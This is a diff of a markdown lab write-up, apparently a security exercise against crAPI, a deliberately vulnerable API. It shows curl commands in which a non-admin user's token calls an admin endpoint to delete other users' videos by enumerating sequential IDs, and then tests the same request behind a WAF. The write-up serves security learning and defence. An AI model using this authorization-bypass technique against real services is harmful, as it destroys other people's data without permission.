@@ -10,28 +10,33 @@ Testing with two hostnames
 **Malicious User:** malicious@example.com/F5@Pass50 
 ## crAPI without WAF - Anyone can delete any video of  others 
 - Login via Web with legit-user, and upload a new video
-![[Pasted image 20260902210926.png|694]]
+<img width="1687" height="1112" alt="image" src="https://github.com/user-attachments/assets/ea80ce2f-2231-44f5-83da-f06fd7a7a16e" />
+
 
 observing the API calls the video has assigned `id=52`, confirm the file, and it's name
 ```zsh unfold ln:false unwrap title:"Command"
+##login and get access token
 export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
-
+##get video using access token
 curl http://10.1.10.104/identity/api/v2/user/videos/52  -H "Authorization: Bearer $token"
 ```
-![[Pasted image 20260902211059.png]]
+<img width="1567" height="305" alt="image" src="https://github.com/user-attachments/assets/c340029b-2890-4e1c-8b28-54a3f3d24bf1" />
+
 
 ```python unfold ln:false unwrap title:"code"
 curl -X PUT http://10.1.10.104/identity/api/v2/user/videos/52  -d '{"videoName":"hamza.mp4"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
 ``` 
 use PUT to change the file name to hamza.mp4
-![[Pasted image 20260902211258.png]]
+<img width="2495" height="415" alt="image" src="https://github.com/user-attachments/assets/13f5452d-83c3-4897-964a-0d434197dad7" />
+
 
 ### User to delete his own video 
 - Trying to delete the file from user URI
 ```python unfold ln:false unwrap title:"code"
 curl -X DELETE  http://10.1.10.104/identity/api/v2/user/videos/52  -d '{"videoName":"hamza.mp4"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
 ```
-![[Pasted image 20260902165331.png]]
+<img width="2424" height="193" alt="image" src="https://github.com/user-attachments/assets/3d693c20-1257-49b5-8ead-f9969ef4c03a" />
+
 so originally the user can't delete his own video just modify the name
 `video deleting is an admin functionality.`
 
@@ -40,13 +45,15 @@ so originally the user can't delete his own video just modify the name
 ```python unfold ln:false unwrap title:"code"
 curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/52  -H "Authorization: Bearer $token" -H "Content-Type: application/json"
 ```
-![[Pasted image 20260902170203.png]]
+<img width="2482" height="208" alt="image" src="https://github.com/user-attachments/assets/bb199b31-adc6-4ce0-b099-c04cd2329a83" />
+
 
 - Confirming that the file has been deleted 
 ```python unfold ln:false unwrap title:"code"
 curl http://10.1.10.104/identity/api/v2/user/videos/52  -H "Authorization: Bearer $token"
 ```
-![[Pasted image 20260902170241.png|976]]
+<img width="1531" height="131" alt="image" src="https://github.com/user-attachments/assets/edade232-ac07-43eb-a5a1-a7827d786685" />
+
 
 ### Deleting someone's video
 - Delete video id 53
@@ -54,20 +61,20 @@ it's looks like the video id is sequential, so let's try to delete the subsequen
 ```python unfold ln:false unwrap title:"code"
 curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/53 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
 ```
-![[Pasted image 20260902171808.png]]
+<img width="2275" height="201" alt="image" src="https://github.com/user-attachments/assets/259cc0a1-bd8b-4429-a06c-2f2e7a3a219d" />
+
 
 - let's try video id 54
-![[Pasted image 20260902172525.png]]
 video 54 belongs to user `newuser`, however we can delete it with token of user `malicious`
 
 ```python unfold ln:false unwrap title:"code"
 curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/54 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
 ```
-![[Pasted image 20260902172719.png]]
+<img width="2253" height="129" alt="image" src="https://github.com/user-attachments/assets/eedf8536-4f77-41d1-a8b5-31bbb60872af" />
 video id 54 deleted with token of malicious user
 
 try video id 55,
-![[Pasted image 20260902172847.png]]
+<img width="2267" height="218" alt="image" src="https://github.com/user-attachments/assets/5e188bbd-ee0f-4a50-80f7-a7dd92642c62" />
 it looks like we ran out of videos! :D 
 
 ## crAPI with WAF protection
@@ -78,5 +85,5 @@ export token=$(curl -X POST http://crapi.local/identity/api/auth/login -d '{"ema
 
 curl -X DELETE  http://crapi.local/identity/api/v2/admin/videos/54 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
 ```
-![[Pasted image 20260902174118.png]]
-![[Pasted image 20260902174250.png]]
+<img width="2285" height="205" alt="image" src="https://github.com/user-attachments/assets/b9db50a6-8bcf-4a08-a77e-de683ca2e6fc" />
+<img width="1345" height="846" alt="image" src="https://github.com/user-attachments/assets/2b036a58-ffb2-4093-b6aa-26999d8c7208" />
